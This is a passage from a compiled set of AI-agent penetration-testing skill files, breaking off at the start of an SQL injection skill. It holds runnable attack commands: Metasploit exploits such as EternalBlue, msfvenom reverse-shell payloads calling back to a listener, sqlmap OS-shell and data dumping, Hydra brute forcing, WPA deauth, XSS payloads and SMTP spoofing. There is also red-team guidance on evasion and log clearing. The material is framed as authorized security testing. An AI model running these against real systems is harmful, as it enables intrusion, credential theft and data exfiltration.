# Check MS08-067
nmap --script smb-vuln-ms08-067 192.168.1.1

# SSH brute force
nmap --script ssh-brute -p 22 192.168.1.1

# FTP anonymous
nmap --script ftp-anon 192.168.1.1

# DNS brute force
nmap --script dns-brute 192.168.1.1

# HTTP methods
nmap -p80 --script http-methods 192.168.1.1

# HTTP headers
nmap -p80 --script http-headers 192.168.1.1

# SQL injection check
nmap --script http-sql-injection -p 80 192.168.1.1
```

**Advanced Scans:**

```bash
# Xmas scan
nmap -sX 192.168.1.1

# ACK scan (firewall detection)
nmap -sA 192.168.1.1

# Window scan
nmap -sW 192.168.1.1

# Traceroute
nmap --traceroute 192.168.1.1
```

### 2. Metasploit Commands

**Basic Usage:**

```bash
# Launch Metasploit
msfconsole

# Search for exploits
search type:exploit name:smb

# Use exploit
use exploit/windows/smb/ms17_010_eternalblue

# Show options
show options

# Set target
set RHOST 192.168.1.1

# Set payload
set PAYLOAD windows/meterpreter/reverse_tcp

# Run exploit
exploit
```

**Common Exploits:**

```bash
# EternalBlue
msfconsole -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOST 192.168.1.1; exploit"

# MS08-067 (Conficker)
msfconsole -x "use exploit/windows/smb/ms08_067_netapi; set RHOST 192.168.1.1; exploit"

# vsftpd backdoor
msfconsole -x "use exploit/unix/ftp/vsftpd_234_backdoor; set RHOST 192.168.1.1; exploit"

# Shellshock
msfconsole -x "use exploit/linux/http/apache_mod_cgi_bash_env_exec; set RHOST 192.168.1.1; exploit"

# Drupalgeddon2
msfconsole -x "use exploit/unix/webapp/drupal_drupalgeddon2; set RHOST 192.168.1.1; exploit"

# PSExec
msfconsole -x "use exploit/windows/smb/psexec; set RHOST 192.168.1.1; set SMBUser user; set SMBPass pass; exploit"
```

**Scanners:**

```bash
# TCP port scan
msfconsole -x "use auxiliary/scanner/portscan/tcp; set RHOSTS 192.168.1.0/24; run"

# SMB version scan
msfconsole -x "use auxiliary/scanner/smb/smb_version; set RHOSTS 192.168.1.0/24; run"

# SMB share enumeration
msfconsole -x "use auxiliary/scanner/smb/smb_enumshares; set RHOSTS 192.168.1.0/24; run"

# SSH brute force
msfconsole -x "use auxiliary/scanner/ssh/ssh_login; set RHOSTS 192.168.1.0/24; set USER_FILE users.txt; set PASS_FILE passwords.txt; run"

# FTP brute force
msfconsole -x "use auxiliary/scanner/ftp/ftp_login; set RHOSTS 192.168.1.0/24; set USER_FILE users.txt; set PASS_FILE passwords.txt; run"

# RDP scanning
msfconsole -x "use auxiliary/scanner/rdp/rdp_scanner; set RHOSTS 192.168.1.0/24; run"
```

**Handler Setup:**

```bash
# Multi-handler for reverse shells
msfconsole -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.1.2; set LPORT 4444; exploit"
```

**Payload Generation (msfvenom):**

```bash
# Windows reverse shell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 LPORT=4444 -f exe > shell.exe

# Linux reverse shell
msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.1.2 LPORT=4444 -f elf > shell.elf

# PHP reverse shell
msfvenom -p php/reverse_php LHOST=192.168.1.2 LPORT=4444 -f raw > shell.php

# ASP reverse shell
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.2 LPORT=4444 -f asp > shell.asp

# WAR file
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.2 LPORT=4444 -f war > shell.war

# Python payload
msfvenom -p cmd/unix/reverse_python LHOST=192.168.1.2 LPORT=4444 -f raw > shell.py
```

### 3. Nikto Commands

```bash
# Basic scan
nikto -h http://192.168.1.1

# Comprehensive scan
nikto -h http://192.168.1.1 -C all

# Output to file
nikto -h http://192.168.1.1 -output report.html

# Plugin-based scans
nikto -h http://192.168.1.1 -Plugins robots
nikto -h http://192.168.1.1 -Plugins shellshock
nikto -h http://192.168.1.1 -Plugins heartbleed
nikto -h http://192.168.1.1 -Plugins ssl

# Export to Metasploit
nikto -h http://192.168.1.1 -Format msf+

# Specific tuning
nikto -h http://192.168.1.1 -Tuning 1  # Interesting files only
```

### 4. SQLMap Commands

```bash
# Basic injection test
sqlmap -u "http://192.168.1.1/page?id=1"

# Enumerate databases
sqlmap -u "http://192.168.1.1/page?id=1" --dbs

# Enumerate tables
sqlmap -u "http://192.168.1.1/page?id=1" -D database --tables

# Dump table
sqlmap -u "http://192.168.1.1/page?id=1" -D database -T users --dump

# OS shell
sqlmap -u "http://192.168.1.1/page?id=1" --os-shell

# POST request
sqlmap -u "http://192.168.1.1/login" --data="user=admin&pass=test"

# Cookie injection
sqlmap -u "http://192.168.1.1/page" --cookie="id=1*"

# Bypass WAF
sqlmap -u "http://192.168.1.1/page?id=1" --tamper=space2comment

# Risk and level
sqlmap -u "http://192.168.1.1/page?id=1" --risk=3 --level=5
```

### 5. Hydra Commands

```bash
# SSH brute force
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.1

# FTP brute force
hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://192.168.1.1

# HTTP POST form
hydra -l admin -P passwords.txt 192.168.1.1 http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"

# HTTP Basic Auth
hydra -l admin -P passwords.txt 192.168.1.1 http-get /admin/

# SMB brute force
hydra -l admin -P passwords.txt smb://192.168.1.1

# RDP brute force
hydra -l admin -P passwords.txt rdp://192.168.1.1

# MySQL brute force
hydra -l root -P passwords.txt mysql://192.168.1.1

# Username list
hydra -L users.txt -P passwords.txt ssh://192.168.1.1
```

### 6. John the Ripper Commands

```bash
# Crack password file
john hash.txt

# Specify wordlist
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt

# Show cracked passwords
john hash.txt --show

# Specify format
john hash.txt --format=raw-md5
john hash.txt --format=nt
john hash.txt --format=sha512crypt

# SSH key passphrase
ssh2john id_rsa > ssh_hash.txt
john ssh_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt

# ZIP password
zip2john file.zip > zip_hash.txt
john zip_hash.txt
```

### 7. Aircrack-ng Commands

```bash
# Monitor mode
airmon-ng start wlan0

# Capture packets
airodump-ng wlan0mon

# Target specific network
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# Deauth attack
aireplay-ng -0 10 -a AA:BB:CC:DD:EE:FF wlan0mon

# Crack WPA handshake
aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap
```

### 8. Wireshark/Tshark Commands

```bash
# Capture traffic
tshark -i eth0 -w capture.pcap

# Read capture file
tshark -r capture.pcap

# Filter by protocol
tshark -r capture.pcap -Y "http"

# Filter by IP
tshark -r capture.pcap -Y "ip.addr == 192.168.1.1"

# Extract HTTP data
tshark -r capture.pcap -Y "http" -T fields -e http.request.uri
```

## Quick Reference

### Common Port Scans

```bash
# Quick scan
nmap -F 192.168.1.1

# Full comprehensive
nmap -sV -sC -A -p- 192.168.1.1

# Fast with version
nmap -sV -T4 192.168.1.1
```

### Password Hash Types

| Mode | Type |
|------|------|
| 0 | MD5 |
| 100 | SHA1 |
| 1000 | NTLM |
| 1800 | sha512crypt |
| 3200 | bcrypt |
| 13100 | Kerberoast |

## Constraints

- Always have written authorization
- Some scans are noisy and detectable
- Brute forcing may lock accounts
- Rate limiting affects tools

## Examples

### Example 1: Quick Vulnerability Scan

```bash
nmap -sV --script vuln 192.168.1.1
```

### Example 2: Web App Test

```bash
nikto -h http://target && sqlmap -u "http://target/page?id=1" --dbs
```

## Troubleshooting

| Issue | Solution |
|-------|----------|
| Scan too slow | Increase timing (-T4, -T5) |
| Ports filtered | Try different scan types |
| Exploit fails | Check target version compatibility |
| Passwords not cracking | Try larger wordlists, rules |


---

<a id="redteamtactics"></a>

## Red Team Tactics

---
name: red-team-tactics
description: Red team tactics principles based on MITRE ATT&CK. Attack phases, detection evasion, reporting.
allowed-tools: Read, Glob, Grep
---

# Red Team Tactics

> Adversary simulation principles based on MITRE ATT&CK framework.

---

## 1. MITRE ATT&CK Phases

### Attack Lifecycle

```
RECONNAISSANCE → INITIAL ACCESS → EXECUTION → PERSISTENCE
       ↓              ↓              ↓            ↓
   PRIVILEGE ESC → DEFENSE EVASION → CRED ACCESS → DISCOVERY
       ↓              ↓              ↓            ↓
LATERAL MOVEMENT → COLLECTION → C2 → EXFILTRATION → IMPACT
```

### Phase Objectives

| Phase | Objective |
|-------|-----------|
| **Recon** | Map attack surface |
| **Initial Access** | Get first foothold |
| **Execution** | Run code on target |
| **Persistence** | Survive reboots |
| **Privilege Escalation** | Get admin/root |
| **Defense Evasion** | Avoid detection |
| **Credential Access** | Harvest credentials |
| **Discovery** | Map internal network |
| **Lateral Movement** | Spread to other systems |
| **Collection** | Gather target data |
| **C2** | Maintain command channel |
| **Exfiltration** | Extract data |

---

## 2. Reconnaissance Principles

### Passive vs Active

| Type | Trade-off |
|------|-----------|
| **Passive** | No target contact, limited info |
| **Active** | Direct contact, more detection risk |

### Information Targets

| Category | Value |
|----------|-------|
| Technology stack | Attack vector selection |
| Employee info | Social engineering |
| Network ranges | Scanning scope |
| Third parties | Supply chain attack |

---

## 3. Initial Access Vectors

### Selection Criteria

| Vector | When to Use |
|--------|-------------|
| **Phishing** | Human target, email access |
| **Public exploits** | Vulnerable services exposed |
| **Valid credentials** | Leaked or cracked |
| **Supply chain** | Third-party access |

---

## 4. Privilege Escalation Principles

### Windows Targets

| Check | Opportunity |
|-------|-------------|
| Unquoted service paths | Write to path |
| Weak service permissions | Modify service |
| Token privileges | Abuse SeDebug, etc. |
| Stored credentials | Harvest |

### Linux Targets

| Check | Opportunity |
|-------|-------------|
| SUID binaries | Execute as owner |
| Sudo misconfiguration | Command execution |
| Kernel vulnerabilities | Kernel exploits |
| Cron jobs | Writable scripts |

---

## 5. Defense Evasion Principles

### Key Techniques

| Technique | Purpose |
|-----------|---------|
| LOLBins | Use legitimate tools |
| Obfuscation | Hide malicious code |
| Timestomping | Hide file modifications |
| Log clearing | Remove evidence |

### Operational Security

- Work during business hours
- Mimic legitimate traffic patterns
- Use encrypted channels
- Blend with normal behavior

---

## 6. Lateral Movement Principles

### Credential Types

| Type | Use |
|------|-----|
| Password | Standard auth |
| Hash | Pass-the-hash |
| Ticket | Pass-the-ticket |
| Certificate | Certificate auth |

### Movement Paths

- Admin shares
- Remote services (RDP, SSH, WinRM)
- Exploitation of internal services

---

## 7. Active Directory Attacks

### Attack Categories

| Attack | Target |
|--------|--------|
| Kerberoasting | Service account passwords |
| AS-REP Roasting | Accounts without pre-auth |
| DCSync | Domain credentials |
| Golden Ticket | Persistent domain access |

---

## 8. Reporting Principles

### Attack Narrative

Document the full attack chain:
1. How initial access was gained
2. What techniques were used
3. What objectives were achieved
4. Where detection failed

### Detection Gaps

For each successful technique:
- What should have detected it?
- Why didn't detection work?
- How to improve detection

---

## 9. Ethical Boundaries

### Always

- Stay within scope
- Minimize impact
- Report immediately if real threat found
- Document all actions

### Never

- Destroy production data
- Cause denial of service (unless scoped)
- Access beyond proof of concept
- Retain sensitive data

---

## 10. Anti-Patterns

| ❌ Don't | ✅ Do |
|----------|-------|
| Rush to exploitation | Follow methodology |
| Cause damage | Minimize impact |
| Skip reporting | Document everything |
| Ignore scope | Stay within boundaries |

---

> **Remember:** Red team simulates attackers to improve defenses, not to cause harm.


---

<a id="redteamtools"></a>

## Red Team Tools

---
name: Red Team Tools and Methodology
description: This skill should be used when the user asks to "follow red team methodology", "perform bug bounty hunting", "automate reconnaissance", "hunt for XSS vulnerabilities", "enumerate subdomains", or needs security researcher techniques and tool configurations from top bug bounty hunters.
metadata:
  author: zebbern
  version: "1.1"
---

# Red Team Tools and Methodology

## Purpose

Implement proven methodologies and tool workflows from top security researchers for effective reconnaissance, vulnerability discovery, and bug bounty hunting. Automate common tasks while maintaining thorough coverage of attack surfaces.

## Inputs/Prerequisites

- Target scope definition (domains, IP ranges, applications)
- Linux-based attack machine (Kali, Ubuntu)
- Bug bounty program rules and scope
- Tool dependencies installed (Go, Python, Ruby)
- API keys for various services (Shodan, Censys, etc.)

## Outputs/Deliverables

- Comprehensive subdomain enumeration
- Live host discovery and technology fingerprinting
- Identified vulnerabilities and attack vectors
- Automated recon pipeline outputs
- Documented findings for reporting

## Core Workflow

### 1. Project Tracking and Acquisitions

Set up reconnaissance tracking:

```bash
# Create project structure
mkdir -p target/{recon,vulns,reports}
cd target

# Find acquisitions using Crunchbase
# Search manually for subsidiary companies

# Get ASN for targets
amass intel -org "Target Company" -src

# Alternative ASN lookup
curl -s "https://bgp.he.net/search?search=targetcompany&commit=Search"
```

### 2. Subdomain Enumeration

Comprehensive subdomain discovery:

```bash
# Create wildcards file
echo "target.com" > wildcards

# Run Amass passively
amass enum -passive -d target.com -src -o amass_passive.txt

# Run Amass actively
amass enum -active -d target.com -src -o amass_active.txt

# Use Subfinder
subfinder -d target.com -silent -o subfinder.txt

# Asset discovery
cat wildcards | assetfinder --subs-only | anew domains.txt

# Alternative subdomain tools
findomain -t target.com -o

# Generate permutations with dnsgen
cat domains.txt | dnsgen - | httprobe > permuted.txt

# Combine all sources
cat amass_*.txt subfinder.txt | sort -u > all_subs.txt
```

### 3. Live Host Discovery

Identify responding hosts:

```bash
# Check which hosts are live with httprobe
cat domains.txt | httprobe -c 80 --prefer-https | anew hosts.txt

# Use httpx for more details
cat domains.txt | httpx -title -tech-detect -status-code -o live_hosts.txt

# Alternative with massdns
massdns -r resolvers.txt -t A -o S domains.txt > resolved.txt
```

### 4. Technology Fingerprinting

Identify technologies for targeted attacks:

```bash
# Whatweb scanning
whatweb -i hosts.txt -a 3 -v > tech_stack.txt

# Nuclei technology detection
nuclei -l hosts.txt -t technologies/ -o tech_nuclei.txt

# Wappalyzer (if available)
# Browser extension for manual review
```

### 5. Content Discovery

Find hidden endpoints and files:

```bash
# Directory bruteforce with ffuf
ffuf -ac -v -u https://target.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt

# Historical URLs from Wayback
waybackurls target.com | tee wayback.txt

# Find all URLs with gau
gau target.com | tee all_urls.txt

# Parameter discovery
cat all_urls.txt | grep "=" | sort -u > params.txt

# Generate custom wordlist from historical data
cat all_urls.txt | unfurl paths | sort -u > custom_wordlist.txt
```

### 6. Application Analysis (Jason Haddix Method)

**Heat Map Priority Areas:**

1. **File Uploads** - Test for injection, XXE, SSRF, shell upload
2. **Content Types** - Filter Burp for multipart forms
3. **APIs** - Look for hidden methods, lack of auth
4. **Profile Sections** - Stored XSS, custom fields
5. **Integrations** - SSRF through third parties
6. **Error Pages** - Exotic injection points

**Analysis Questions:**
- How does the app pass data? (Params, API, Hybrid)
- Where does the app talk about users? (UID, UUID endpoints)
- Does the site have multi-tenancy or user levels?
- Does it have a unique threat model?
- How does the site handle XSS/CSRF?
- Has the site had past writeups/exploits?

### 7. Automated XSS Hunting

```bash
# ParamSpider for parameter extraction
python3 paramspider.py --domain target.com -o params.txt

# Filter with Gxss
cat params.txt | Gxss -p test

# Dalfox for XSS testing
cat params.txt | dalfox pipe --mining-dict params.txt -o xss_results.txt

# Alternative workflow
waybackurls target.com | grep "=" | qsreplace '"><script>alert(1)</script>' | while read url; do
    curl -s "$url" | grep -q 'alert(1)' && echo "$url"
done > potential_xss.txt
```

### 8. Vulnerability Scanning

```bash
# Nuclei comprehensive scan
nuclei -l hosts.txt -t ~/nuclei-templates/ -o nuclei_results.txt

# Check for common CVEs
nuclei -l hosts.txt -t cves/ -o cve_results.txt

# Web vulnerabilities
nuclei -l hosts.txt -t vulnerabilities/ -o vuln_results.txt
```

### 9. API Enumeration

**Wordlists for API fuzzing:**

```bash
# Enumerate API endpoints
ffuf -u https://target.com/api/FUZZ -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt

# Test API versions
ffuf -u https://target.com/api/v1/FUZZ -w api_wordlist.txt
ffuf -u https://target.com/api/v2/FUZZ -w api_wordlist.txt

# Check for hidden methods
for method in GET POST PUT DELETE PATCH; do
    curl -X $method https://target.com/api/users -v
done
```

### 10. Automated Recon Script

```bash
#!/bin/bash
domain=$1

if [[ -z $domain ]]; then
    echo "Usage: ./recon.sh <domain>"
    exit 1
fi

mkdir -p "$domain"

# Subdomain enumeration
echo "[*] Enumerating subdomains..."
subfinder -d "$domain" -silent > "$domain/subs.txt"

# Live host discovery
echo "[*] Finding live hosts..."
cat "$domain/subs.txt" | httpx -title -tech-detect -status-code > "$domain/live.txt"

# URL collection
echo "[*] Collecting URLs..."
cat "$domain/live.txt" | waybackurls > "$domain/urls.txt"

# Nuclei scanning
echo "[*] Running Nuclei..."
nuclei -l "$domain/live.txt" -o "$domain/nuclei.txt"

echo "[+] Recon complete!"
```

## Quick Reference

### Essential Tools

| Tool | Purpose |
|------|---------|
| Amass | Subdomain enumeration |
| Subfinder | Fast subdomain discovery |
| httpx/httprobe | Live host detection |
| ffuf | Content discovery |
| Nuclei | Vulnerability scanning |
| Burp Suite | Manual testing |
| Dalfox | XSS automation |
| waybackurls | Historical URL mining |

### Key API Endpoints to Check

```
/api/v1/users
/api/v1/admin
/api/v1/profile
/api/users/me
/api/config
/api/debug
/api/swagger
/api/graphql
```

### XSS Filter Testing

```html
<!-- Test encoding handling -->
<h1><img><table>
<script>
%3Cscript%3E
%253Cscript%253E
%26lt;script%26gt;
```

## Constraints

- Respect program scope boundaries
- Avoid DoS or fuzzing on production without permission
- Rate limit requests to avoid blocking
- Some tools may generate false positives
- API keys required for full functionality of some tools

## Examples

### Example 1: Quick Subdomain Recon

```bash
subfinder -d target.com | httpx -title | tee results.txt
```

### Example 2: XSS Hunting Pipeline

```bash
waybackurls target.com | grep "=" | qsreplace "test" | httpx -silent | dalfox pipe
```

### Example 3: Comprehensive Scan

```bash
# Full recon chain
amass enum -d target.com | httpx | nuclei -t ~/nuclei-templates/
```

## Troubleshooting

| Issue | Solution |
|-------|----------|
| Rate limited | Use proxy rotation, reduce concurrency |
| Too many results | Focus on specific technology stacks |
| False positives | Manually verify findings before reporting |
| Missing subdomains | Combine multiple enumeration sources |
| API key errors | Verify keys in config files |
| Tools not found | Install Go tools with `go install` |


---

<a id="smtppenetrationtesting"></a>

## Smtp Penetration Testing

---
name: SMTP Penetration Testing
description: This skill should be used when the user asks to "perform SMTP penetration testing", "enumerate email users", "test for open mail relays", "grab SMTP banners", "brute force email credentials", or "assess mail server security". It provides comprehensive techniques for testing SMTP server security.
metadata:
  author: zebbern
  version: "1.1"
---

# SMTP Penetration Testing

## Purpose

Conduct comprehensive security assessments of SMTP (Simple Mail Transfer Protocol) servers to identify vulnerabilities including open relays, user enumeration, weak authentication, and misconfiguration. This skill covers banner grabbing, user enumeration techniques, relay testing, brute force attacks, and security hardening recommendations.

## Prerequisites

### Required Tools
```bash
# Nmap with SMTP scripts
sudo apt-get install nmap

# Netcat
sudo apt-get install netcat

# Hydra for brute force
sudo apt-get install hydra

# SMTP user enumeration tool
sudo apt-get install smtp-user-enum

# Metasploit Framework
msfconsole
```

### Required Knowledge
- SMTP protocol fundamentals
- Email architecture (MTA, MDA, MUA)
- DNS and MX records
- Network protocols

### Required Access
- Target SMTP server IP/hostname
- Written authorization for testing
- Wordlists for enumeration and brute force

## Outputs and Deliverables

1. **SMTP Security Assessment Report** - Comprehensive vulnerability findings
2. **User Enumeration Results** - Valid email addresses discovered
3. **Relay Test Results** - Open relay status and exploitation potential
4. **Remediation Recommendations** - Security hardening guidance

## Core Workflow

### Phase 1: SMTP Architecture Understanding

```
Components: MTA (transfer) → MDA (delivery) → MUA (client)

Ports: 25 (SMTP), 465 (SMTPS), 587 (submission), 2525 (alternative)

Workflow: Sender MUA → Sender MTA → DNS/MX → Recipient MTA → MDA → Recipient MUA
```

### Phase 2: SMTP Service Discovery

Identify SMTP servers and versions:

```bash
# Discover SMTP ports
nmap -p 25,465,587,2525 -sV TARGET_IP

# Aggressive service detection
nmap -sV -sC -p 25 TARGET_IP

# SMTP-specific scripts
nmap --script=smtp-* -p 25 TARGET_IP

# Discover MX records for domain
dig MX target.com
nslookup -type=mx target.com
host -t mx target.com
```

### Phase 3: Banner Grabbing

Retrieve SMTP server information:

```bash
# Using Telnet
telnet TARGET_IP 25
# Response: 220 mail.target.com ESMTP Postfix

# Using Netcat
nc TARGET_IP 25
# Response: 220 mail.target.com ESMTP

# Using Nmap
nmap -sV -p 25 TARGET_IP
# Version detection extracts banner info

# Manual SMTP commands
EHLO test
# Response reveals supported extensions
```

Parse banner information:

```
Banner reveals:
- Server software (Postfix, Sendmail, Exchange)
- Version information
- Hostname
- Supported SMTP extensions (STARTTLS, AUTH, etc.)
```

### Phase 4: SMTP Command Enumeration

Test available SMTP commands:

```bash
# Connect and test commands
nc TARGET_IP 25

# Initial greeting
EHLO attacker.com

# Response shows capabilities:
250-mail.target.com
250-PIPELINING
250-SIZE 10240000
250-VRFY
250-ETRN
250-STARTTLS
250-AUTH PLAIN LOGIN
250-8BITMIME
250 DSN
```

Key commands to test:

```bash
# VRFY - Verify user exists
VRFY admin
250 2.1.5 admin@target.com

# EXPN - Expand mailing list
EXPN staff
250 2.1.5 user1@target.com
250 2.1.5 user2@target.com

# RCPT TO - Recipient verification
MAIL FROM:<test@attacker.com>
RCPT TO:<admin@target.com>
# 250 OK = user exists
# 550 = user doesn't exist
```

### Phase 5: User Enumeration

Enumerate valid email addresses:

```bash
# Using smtp-user-enum with VRFY
smtp-user-enum -M VRFY -U /usr/share/wordlists/users.txt -t TARGET_IP

# Using EXPN method
smtp-user-enum -M EXPN -U /usr/share/wordlists/users.txt -t TARGET_IP

# Using RCPT method
smtp-user-enum -M RCPT -U /usr/share/wordlists/users.txt -t TARGET_IP

# Specify port and domain
smtp-user-enum -M VRFY -U users.txt -t TARGET_IP -p 25 -d target.com
```

Using Metasploit:

```bash
use auxiliary/scanner/smtp/smtp_enum
set RHOSTS TARGET_IP
set USER_FILE /usr/share/wordlists/metasploit/unix_users.txt
set UNIXONLY true
run
```

Using Nmap:

```bash
# SMTP user enumeration script
nmap --script smtp-enum-users -p 25 TARGET_IP

# With custom user list
nmap --script smtp-enum-users --script-args smtp-enum-users.methods={VRFY,EXPN,RCPT} -p 25 TARGET_IP
```

### Phase 6: Open Relay Testing

Test for unauthorized email relay:

```bash
# Using Nmap
nmap -p 25 --script smtp-open-relay TARGET_IP

# Manual testing via Telnet
telnet TARGET_IP 25
HELO attacker.com
MAIL FROM:<test@attacker.com>
RCPT TO:<victim@external-domain.com>
DATA
Subject: Relay Test
This is a test.
.
QUIT

# If accepted (250 OK), server is open relay
```

Using Metasploit:

```bash
use auxiliary/scanner/smtp/smtp_relay
set RHOSTS TARGET_IP
run
```

Test variations:

```bash
# Test different sender/recipient combinations
MAIL FROM:<>
MAIL FROM:<test@[attacker_IP]>
MAIL FROM:<test@target.com>

RCPT TO:<test@external.com>
RCPT TO:<"test@external.com">
RCPT TO:<test%external.com@target.com>
```

### Phase 7: Brute Force Authentication

Test for weak SMTP credentials:

```bash
# Using Hydra
hydra -l admin -P /usr/share/wordlists/rockyou.txt smtp://TARGET_IP

# With specific port and SSL
hydra -l admin -P passwords.txt -s 465 -S TARGET_IP smtp

# Multiple users
hydra -L users.txt -P passwords.txt TARGET_IP smtp

# Verbose output
hydra -l admin -P passwords.txt smtp://TARGET_IP -V
```

Using Medusa:

```bash
medusa -h TARGET_IP -u admin -P /path/to/passwords.txt -M smtp
```

Using Metasploit:

```bash
use auxiliary/scanner/smtp/smtp_login
set RHOSTS TARGET_IP
set USER_FILE /path/to/users.txt
set PASS_FILE /path/to/passwords.txt
set VERBOSE true
run
```

### Phase 8: SMTP Command Injection

Test for command injection vulnerabilities:

```bash
# Header injection test
MAIL FROM:<attacker@test.com>
RCPT TO:<victim@target.com>
DATA
Subject: Test
Bcc: hidden@attacker.com
X-Injected: malicious-header

Injected content
.
```

Email spoofing test:

```bash
# Spoofed sender (tests SPF/DKIM protection)
MAIL FROM:<ceo@target.com>
RCPT TO:<employee@target.com>
DATA
From: CEO <ceo@target.com>
Subject: Urgent Request
Please process this request immediately.
.
```

### Phase 9: TLS/SSL Security Testing

Test encryption configuration:

```bash
# STARTTLS support check
openssl s_client -connect TARGET_IP:25 -starttls smtp

# Direct SSL (port 465)
openssl s_client -connect TARGET_IP:465

# Cipher enumeration
nmap --script ssl-enum-ciphers -p 25 TARGET_IP
```

### Phase 10: SPF, DKIM, DMARC Analysis

Check email authentication records:

```bash
# SPF/DKIM/DMARC record lookups
dig TXT target.com | grep spf            # SPF
dig TXT selector._domainkey.target.com    # DKIM
dig TXT _dmarc.target.com                 # DMARC

# SPF policy: -all = strict fail, ~all = soft fail, ?all = neutral
```

## Quick Reference

### Essential SMTP Commands

| Command | Purpose | Example |
|---------|---------|---------|
| HELO | Identify client | `HELO client.com` |
| EHLO | Extended HELO | `EHLO client.com` |
| MAIL FROM | Set sender | `MAIL FROM:<sender@test.com>` |
| RCPT TO | Set recipient | `RCPT TO:<user@target.com>` |
| DATA | Start message body | `DATA` |
| VRFY | Verify user | `VRFY admin` |
| EXPN | Expand alias | `EXPN staff` |
| QUIT | End session | `QUIT` |

### SMTP Response Codes

| Code | Meaning |
|------|---------|
| 220 | Service ready |
| 221 | Closing connection |
| 250 | OK / Requested action completed |
| 354 | Start mail input |
| 421 | Service not available |
| 450 | Mailbox unavailable |
| 550 | User unknown / Mailbox not found |
| 553 | Mailbox name not allowed |

### Enumeration Tool Commands

| Tool | Command |
|------|---------|
| smtp-user-enum | `smtp-user-enum -M VRFY -U users.txt -t IP` |
| Nmap | `nmap --script smtp-enum-users -p 25 IP` |
| Metasploit | `use auxiliary/scanner/smtp/smtp_enum` |
| Netcat | `nc IP 25` then manual commands |

### Common Vulnerabilities

| Vulnerability | Risk | Test Method |
|--------------|------|-------------|
| Open Relay | High | Relay test with external recipient |
| User Enumeration | Medium | VRFY/EXPN/RCPT commands |
| Banner Disclosure | Low | Banner grabbing |
| Weak Auth | High | Brute force attack |
| No TLS | Medium | STARTTLS test |
| Missing SPF/DKIM | Medium | DNS record lookup |

## Constraints and Limitations

### Legal Requirements
- Only test SMTP servers you own or have authorization to test
- Sending spam or malicious emails is illegal
- Document all testing activities
- Do not abuse discovered open relays

### Technical Limitations
- VRFY/EXPN often disabled on modern servers
- Rate limiting may slow enumeration
- Some servers respond identically for valid/invalid users
- Greylisting may delay enumeration responses

### Ethical Boundaries
- Never send actual spam through discovered relays
- Do not harvest email addresses for malicious use
- Report open relays to server administrators
- Use findings only for authorized security improvement

## Examples

### Example 1: Complete SMTP Assessment

**Scenario:** Full security assessment of mail server

```bash
# Step 1: Service discovery
nmap -sV -sC -p 25,465,587 mail.target.com

# Step 2: Banner grab
nc mail.target.com 25
EHLO test.com
QUIT

# Step 3: User enumeration
smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt -t mail.target.com

# Step 4: Open relay test
nmap -p 25 --script smtp-open-relay mail.target.com

# Step 5: Authentication test
hydra -l admin -P /usr/share/wordlists/fasttrack.txt smtp://mail.target.com

# Step 6: TLS check
openssl s_client -connect mail.target.com:25 -starttls smtp

# Step 7: Check email authentication
dig TXT target.com | grep spf
dig TXT _dmarc.target.com
```

### Example 2: User Enumeration Attack

**Scenario:** Enumerate valid users for phishing preparation

```bash
# Method 1: VRFY
smtp-user-enum -M VRFY -U users.txt -t 192.168.1.100 -p 25

# Method 2: RCPT with timing analysis
smtp-user-enum -M RCPT -U users.txt -t 192.168.1.100 -p 25 -d target.com

# Method 3: Metasploit
msfconsole
use auxiliary/scanner/smtp/smtp_enum
set RHOSTS 192.168.1.100
set USER_FILE /usr/share/metasploit-framework/data/wordlists/unix_users.txt
run

# Results show valid users
[+] 192.168.1.100:25 - Found user: admin
[+] 192.168.1.100:25 - Found user: root
[+] 192.168.1.100:25 - Found user: postmaster
```

### Example 3: Open Relay Exploitation

**Scenario:** Test and document open relay vulnerability

```bash
# Test via Telnet
telnet mail.target.com 25
HELO attacker.com
MAIL FROM:<test@attacker.com>
RCPT TO:<test@gmail.com>
# If 250 OK - VULNERABLE

# Document with Nmap
nmap -p 25 --script smtp-open-relay --script-args smtp-open-relay.from=test@attacker.com,smtp-open-relay.to=test@external.com mail.target.com

# Output:
# PORT   STATE SERVICE
# 25/tcp open  smtp
# |_smtp-open-relay: Server is an open relay (14/16 tests)
```

## Troubleshooting

| Issue | Cause | Solution |
|-------|-------|----------|
| Connection Refused | Port blocked or closed | Check port with nmap; ISP may block port 25; try 587/465; use VPN |
| VRFY/EXPN Disabled | Server hardened | Use RCPT TO method; analyze response time/code variations |
| Brute Force Blocked | Rate limiting/lockout | Slow down (`hydra -W 5`); use password spraying; check for fail2ban |
| SSL/TLS Errors | Wrong port or protocol | Use 465 for SSL, 25/587 for STARTTLS; verify EHLO response |

## Security Recommendations

### For Administrators

1. **Disable Open Relay** - Require authentication for external delivery
2. **Disable VRFY/EXPN** - Prevent user enumeration
3. **Enforce TLS** - Require STARTTLS for all connections
4. **Implement SPF/DKIM/DMARC** - Prevent email spoofing
5. **Rate Limiting** - Prevent brute force attacks
6. **Account Lockout** - Lock accounts after failed attempts
7. **Banner Hardening** - Minimize server information disclosure
8. **Log Monitoring** - Alert on suspicious activity
9. **Patch Management** - Keep SMTP software updated
10. **Access Controls** - Restrict SMTP to authorized IPs


---

<a id="sqlinjectiontesting"></a>

## Sql Injection Testing

---
name: SQL Injection Testing
description: This skill should be used when the user asks to "test for SQL injection vulnerabilities", "perform SQLi attacks", "bypass authentication using SQL injection", "extract database information through injection", "detect SQL injection flaws", or "exploit database query vulnerabilities". It provides comprehensive techniques for identifying, exploiting, and understanding SQL injection attack vectors across different database systems.
metadata:
  author: zebbern
  version: "1.1"
---

# SQL Injection Testing

## Purpose

